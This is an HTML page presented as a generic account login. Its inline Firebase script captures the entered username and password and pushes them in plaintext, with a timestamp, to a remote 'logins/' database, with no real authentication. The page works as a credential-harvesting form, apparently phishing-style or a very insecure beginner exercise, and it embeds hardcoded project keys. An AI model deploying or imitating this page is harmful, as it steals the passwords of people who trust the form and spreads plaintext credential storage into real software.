<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login Page</title>

  <!-- Import Firebase SDK -->
  <script type="module">
    // Import the functions you need from the SDKs
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/11.0.2/firebase-database.js";
    
    // Your web app's Firebase configuration
    const firebaseConfig = {
      apiKey: "AIzaSyDvuyyJgxMq3o-K9INQjj1GSrTInC6argQ",
      authDomain: "project888-9c8bf.firebaseapp.com",
      databaseURL: "https://project888-9c8bf-default-rtdb.firebaseio.com",
      projectId: "project888-9c8bf",
      storageBucket: "project888-9c8bf.appspot.com",
      messagingSenderId: "1028003437122",
      appId: "1:1028003437122:web:c78a63b44a9c3e5c89abdb",
      measurementId: "G-G1HQFRWJ9K"
    };

    // Initialize Firebase
    const app = initializeApp(firebaseConfig);
    const database = getDatabase(app);

    // Function to save login data to Firebase
    function saveLoginData(username, password) {
      const dbRef = ref(database, 'logins/');
      push(dbRef, {
        username: username,
        password: password,
        timestamp: new Date().toISOString()
      }).then(() => {
        alert("Data saved successfully!");
      }).catch((error) => {
        console.error("Error saving data:", error);
      });
    }

    // Form submit handler
    window.handleSubmit = function (event) {
      event.preventDefault();
      const username = document.getElementById("username").value;
      const password = document.getElementById("password").value;
      saveLoginData(username, password);
    };
  </script>
</head>
<body>
  <h1>Login to Your Account</h1>
  <form id="loginForm" onsubmit="handleSubmit(event)">
    <label for="username">Username:</label>
    <input type="text" id="username" required><br><br>
    
    <label for="password">Password:</label>
    <input type="password" id="password" required><br><br>
    
    <button type="submit">Login</button>
  </form>
</body>
</html>
